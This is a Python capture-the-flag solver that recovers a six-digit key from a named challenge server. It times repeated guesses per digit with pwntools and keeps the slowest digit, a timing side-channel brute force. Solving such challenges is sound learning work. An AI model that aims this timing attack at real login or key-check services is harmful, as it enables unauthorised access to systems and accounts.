#!/usr/bin/env python3
from pwn import *
import time

HOST = "chals.disorientation.cssa.club"
PORT = 9531
KEY_SIZE = 6
SAMPLE_SIZE = 3

# Only shows errors since we are doing a lot of connection instances
context.log_level = 'error'   

# Sends a key (digits) and returns the response + elapsed time
def try_key(digits):
    key_str = ','.join(str(d) for d in digits)
    r = remote(HOST, PORT, timeout=15)
    r.recv(timeout=5)

    start = time.time()
    r.sendline(key_str.encode())

    response = r.recv(timeout=15)
    elapsed = time.time() - start
    r.close()
    return elapsed, response.decode(errors="ignore").strip()

# Brute force the key based on timing attacks
def find_key():
    known = []
    
    for position in range(KEY_SIZE):
        print(f"\nFinding digit {position + 1}...")
        best_digit = None
        best_time = -1
        
        for digit in range(10):
            # Full guess = known correct digits + current digit + zeros
            candidate = known + [digit] + [0] * (5 - position)
            
            # Reduce noise 
            times = []
            for _ in range(SAMPLE_SIZE):
                elapsed, response = try_key(candidate)
                times.append(elapsed)

                # Success
                if 'login key' in response.lower():
                    print(f"\nFull key found: {','.join(str(x) for x in candidate[:position+1])}")
                    print(f"\nResponse: {response}")
                    return candidate[:position+1]
                time.sleep(0.2)
            
            avg_time = sum(times) / len(times)
            print(f"    Digit {digit}: avg={avg_time:.3f}s  (response: {times})")
            if avg_time > best_time:
                best_time = avg_time
                best_digit = digit
        
        print(f"Digit {position + 1} = {best_digit} (took ~{best_time:.2f}s)")
        known.append(best_digit)
    
    # Ran out of guesses
    return known


key = find_key()
print(f"Flag: disorientation{{{','.join(str(d) for d in key)}}}")
